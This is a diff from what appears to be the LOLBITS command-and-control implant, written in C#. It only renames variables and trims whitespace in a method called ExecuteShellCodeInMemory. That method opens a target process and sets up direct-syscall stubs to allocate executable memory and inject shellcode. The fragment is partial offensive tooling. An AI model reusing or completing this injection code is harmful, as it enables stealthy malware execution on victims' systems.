@@ -84,7 +84,7 @@ namespace LOLBITS.Controlling
         static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType lAllocationType, MemoryProtection flProtect);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        internal delegate int NtAllocateVirtualMemory(IntPtr processHandle, out IntPtr baseAddress, uint zeroBits, out UIntPtr regionSize, AllocationType AllocationType, MemoryProtection protect);
+        internal delegate int NtAllocateVirtualMemory(IntPtr processHandle, out IntPtr baseAddress, uint zeroBits, out UIntPtr regionSize, AllocationType allocationType, MemoryProtection protect);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         internal delegate int NtWriteVirtualMemory(IntPtr processHandle, IntPtr address, byte[] buffer, UIntPtr size, IntPtr bytesWrittenBuffer);
@@ -111,11 +111,10 @@ namespace LOLBITS.Controlling
 
         public static unsafe void ExecuteShellCodeInMemory(object args)        
         {
-
-            object[] argumentos = (object[])args;
-            byte[] sc = (byte[]) argumentos[0];
-            SysCallManager sysCall = (SysCallManager)argumentos[1];
-            int pid = (int)argumentos[2];
+            object[] parameterArguments = (object[])args;
+            byte[] sc = (byte[]) parameterArguments[0];
+            SysCallManager sysCall = (SysCallManager)parameterArguments[1];
+            int pid = (int)parameterArguments[2];
             IntPtr handle = Process.GetCurrentProcess().Handle;
 
             if(pid != -1)
@@ -131,10 +130,8 @@ namespace LOLBITS.Controlling
                                                         Utils.ProcessAccessFlags.VirtualMemoryOperation | Utils.ProcessAccessFlags.VirtualMemoryWrite | Utils.ProcessAccessFlags.VirtualMemoryRead);
             }
 
-
             try
             {
-
                 IntPtr baseAddr = IntPtr.Zero;
                 byte[] shellcode = sysCall.GetSysCallAsm("NtAllocateVirtualMemory");
                 var shellcodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ExecuteReadwrite);
@@ -190,8 +187,6 @@ namespace LOLBITS.Controlling
                 
             }
             catch {}
-         
         }
-
     }
 }
